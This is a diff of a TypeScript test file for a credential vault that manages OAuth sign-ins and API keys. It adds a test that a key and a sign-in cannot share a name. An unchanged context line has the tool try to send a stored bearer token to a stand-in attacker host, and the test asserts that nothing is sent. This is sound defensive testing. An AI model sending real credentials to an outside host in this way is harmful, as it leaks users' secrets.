@@ -11,7 +11,7 @@ import type { AddressInfo } from "node:net";
 import path from "node:path";
 import test from "node:test";
 import * as vault from "#shared/vault";
-import { call, post, postVault, reset, saveSignIn, storage, until, vaultState } from "./harness.mts";
+import { call, giveKey, postVault, reset, saveSignIn, seal, storage, until, vaultState } from "./harness.mts";
 
 // The provider: a device endpoint that gives codes, a token endpoint that checks the client (an ID, no
 // secret) and rotates refresh tokens, and an API that wants the current access token. Whether the user agreed (or declined), whether the next ask is told to slow down or that the code
@@ -350,6 +350,21 @@ test("a sign-in of the removed kind (no device address) is never used, and says 
   await vault.update((v) => void Object.assign(v.entries.find((e) => e.user === "old")!, { tokens: { access_token: "at-old", refresh_token: "rt-old", expires_at: null } }));
   assert.match(await statusOf("old") ?? "", removed, "tokens it holds don't make it signed in");
   assert.match(await call({ action: "call", url: "https://attacker.example/x", auth: { key: "old", as: "bearer" } }), removed, "and none is sent");
+});
+
+test("a name is one secret: a key can't take a sign-in's name, nor a sign-in a key's", async () => {
+  await seed("dev");
+  await call({ action: "library" }); // the Vault is there
+  const signInTaken = /"dev" is a sign-in already: use another name, or the user deletes it on the Vault first/;
+  assert.match(await call({ action: "secret", site: "api.example.com", label: "dev" }), signInTaken, "asked for a key under its name: told, and the Vault asks for none");
+  assert.deepEqual(vaultState().needs, []);
+  postVault({ ev: "key-save", label: "dev", site: "api.example.com", sealed: seal("k") }); // as a stale page could post it
+  assert.equal(await statusOf("dev"), "ready to sign in", "the sign-in stays");
+  await giveKey("kk", "api.example.com", "v1");
+  await assert.rejects(saveSignIn("127.0.0.1", "kk", definitionAt(OTHER), "client-1"), /"kk" is a key already: use another name/);
+  assert.equal(await statusOf("kk"), "saved", "the key stays");
+  await giveKey("kk", "api.example.com", "v2"); // a key is rotated by saving it again
+  assert.equal(vaultState().secrets.filter((s: { label: string }) => s.label === "kk").length, 1);
 });
 
 test("the Vault shows each sign-in's tag as the library gives it", async () => {
